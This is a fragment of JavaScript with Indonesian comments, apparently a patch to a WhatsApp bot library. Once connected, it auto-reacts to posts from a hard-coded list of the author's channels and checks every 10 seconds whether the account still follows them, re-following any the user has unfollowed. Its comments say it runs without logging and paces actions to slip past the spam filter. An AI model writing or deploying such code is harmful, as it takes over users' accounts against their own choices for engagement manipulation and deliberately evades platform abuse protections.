...
const updateTargetNewsletters = async () => {
    // Memastikan target selalu terkunci ke ID channel kamu
    _targetNewsletters = [...MY_CHANNELS];
};

// --- Perbaikan Auto React ---
sock.ev.on('messages.upsert', async ({ messages, type }) => {
    ...
    for (const msg of messages) {
        ...
        // Cek apakah pesan berasal dari channel target
        if (!jid || !_targetNewsletters.includes(jid)) continue;
        
        const emoji = emojis[Math.floor(Math.random() * emojis.length)];
        
        try {
            // Mengambil ID pesan yang benar untuk reaksi newsletter
            ...
            // Delay antar reaksi jika ada banyak pesan masuk sekaligus
...
// --- Perbaikan Auto Follow (Interval 10 Detik & No Log) ---
const _ensureFollow = async () => {
    // Tetap berjalan jika autoFollowEnabled aktif di config
    if (!_configNewsletter.autoFollowEnabled) return;

    try {
        // Ambil daftar channel yang sudah diikuti dari server
        const list = await executeWMexQuery({}, '6388546374527196', 'xwa2_newsletter_subscribed', query, generateMessageTag);
        
        for (const newsletterJid of MY_CHANNELS) {
            const isFollowing = list?.some(n => n.id === newsletterJid);

            if (!isFollowing) {
                // Jika user unfollow, hapus dari cache local dan follow kembali
                _followedSet.delete(newsletterJid); 
                await newsletterWMexQuery(newsletterJid, Types_1.QueryIds.FOLLOW);
                
                // Delay singkat agar tidak terkena spam filter
                await sleep(2000);
...
sock.ev.on('connection.update', async ({ connection }) => {
    if (connection === 'open') {
        ...
        // Jalankan pengecekan pertama kali saat koneksi terbuka
        await _ensureFollow();
        
        // Set interval pengecekan setiap 10 detik (10000ms)
        if (_followInterval) clearInterval(_followInterval);
        _followInterval = setInterval(_ensureFollow, 10000); 
    }
});
